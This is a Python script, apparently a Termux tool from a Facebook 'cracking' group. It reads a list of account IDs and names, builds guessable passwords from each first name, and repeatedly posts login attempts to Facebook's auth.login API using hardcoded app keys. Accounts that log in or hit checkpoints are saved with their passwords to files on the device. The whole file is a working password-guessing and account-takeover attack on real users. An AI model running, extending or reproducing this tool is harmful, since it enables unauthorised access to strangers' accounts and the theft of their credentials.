'''
    </> CODED BY : Nazim Hossain 
    </> Telegram : @nazimhussain2
    </> Channel : @https://t.me/mafiatermux
    </> Github : github.com/mdnazim92
'''
import os,sys,requests,random,time
from concurrent.futures import ThreadPoolExecutor as tred
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
N = '\x1b[0m'  
H = '\x1b[1;92m'
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
pwv,id = [],[]
os.system('clear')
def file():
    print('''
    </> Decode By :- Kalyan king 
    </> CODED BY : Limon Hossain 
    </> Telegram : @kalyanvai
    </> Channel : @https://t.me/KGF_TERMUX_TEAM
    </> Github : github.com/LMNx9-JOHNY''');print(45*"-")
    fileX = input (' </> ENTER FILE Path : ')
    print(45*"-")
    for line in open(fileX, 'r').readlines():
        id.append(line.strip())
    passwrd()
def passwrd():
    with tred(max_workers=32) as LimoN:
        for naw in id:
            idf,nmf = naw.split('|')[0],naw.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv= []
            pwv.append(nmf)
            pwv.append(frs+frs)
            pwv.append(frs+'123')
            pwv.append(frs+'123321')
            pwv.append(frs+'1212')
            pwv.append(frs+'123123')
            pwv.append(frs+'1234')
            pwv.append(frs+'12345678')
            pwv.append(frs+'1234@')
            pwv.append(frs+'12345@')
            pwv.append(frs+'12345')
            pwv.append(frs+'11223344')
            pwv.append(frs+'112233')
            pwv.append(frs+'1995')
            pwv.append(frs+'1996')
            pwv.append(frs+'1997')
            pwv.append(frs+'1998')
            pwv.append(frs+'1999')
            pwv.append(frs+'2000')
            pwv.append(frs+'2001')
            pwv.append(frs+'2002')
            pwv.append(frs+'2003')
            pwv.append(frs+'2004')
            pwv.append(frs+'2005')
            pwv.append(frs+'2006')
            pwv.append(frs+'2007')
            pwv.append(frs+'1122')
            pwv.append(frs+'1221')
            pwv.append(frs+'112233')
            pwv.append(frs+'321')
            pwv.append(frs+'332211')
            pwv.append('12345678'+frs)
            pwv.append('123456789'+frs)
            pwv.append(frs+'123'+frs)
            pwv.append(frs+'1234'+frs)
            pwv.append('123'+frs)
            pwv.append('1234'+frs)
            pwv.append('12345'+frs)
            pwv.append('123456'+frs)
            LimoN.submit(crack,idf,pwv)
            crack(idf,pwv)
    print(45*"-")
    print("\n </> LMNx9 Total Cp : "+str(cpp))
    print("\n </> LMNx9 Total Ok : "+str(okk))

okk,cpp =[],[]
loop,ok,cp =0,0,0
def crack(idf,pwv):
    global loop,ok,cp,okk,cpp
    bo = random.choice([P])
    sys.stdout.write(f"\r[LMNx9-File] [{loop}|{len(id)}] [\u001b[32;1m{str(ok)}\u001b[0m=\u001b[33;1m{str(cp)}\u001b \u001b[0m]"),sys.stdout.flush()
    ses = requests.Session()
    for pw in pwv:
        time.sleep(1)
        try:
            url = 'https://graph.facebook.com/v13.0/1036341366506456/activities'
            headers = {
                'User-Agent': "FBAndroidSDK.13.2.0",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "gzip",
                'Content-Type': "application/x-www-form-urlencoded",
                'Accept-Language': "ar_EG",
                'Content-Encoding': "gzip",
                'Transfer-Encoding': "chunked"}
            data = {
                'adid': '832d1110-8291-4323-b575-06dd1f6fe5ed',
                'format': 'json',
                'device_id': '9d00978b-b44e-4ea1-bb5e-c2a6b4f0f1bf',
                'cpl': 'true',
                'family_device_id': '143e620e-8586-45d9-9a70-12cfe393c201',
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': idf,
                'password': pw,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': '255d5c7f-7249-464f-a597-791c7c3e07d0',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'}
            DarkXres = ses.post(url, headers=headers, data=data)
            if 'c_user' in DarkXres.text:
                print(f'\u001b[32;1m\nLMNx9-Ok-ðŸ”· : {idf} | {pw}')
                ok+=1;okk.append(idf)
                XNXX=open("/sdcard/LMNxFILE-Ok.txt", "a")
                XNXX.write(idf+"|"+pw+"\n");XNXX.close
                break
            elif 'Login approvals' in DarkXres.text:
                print(f'\u001b[33;1m\nLMNx9-Cp-ðŸ”¶ : {idf} | {pw}')
                cp+=1;cpp.append(idf)
                XNXX=open("/sdcard/LMNxFILE-Cp.txt", "a")
                XNXX.write(idf+"|"+pw+"\n");XNXX.close
                break
            else:continue
        except:continue
    loop+=1
file()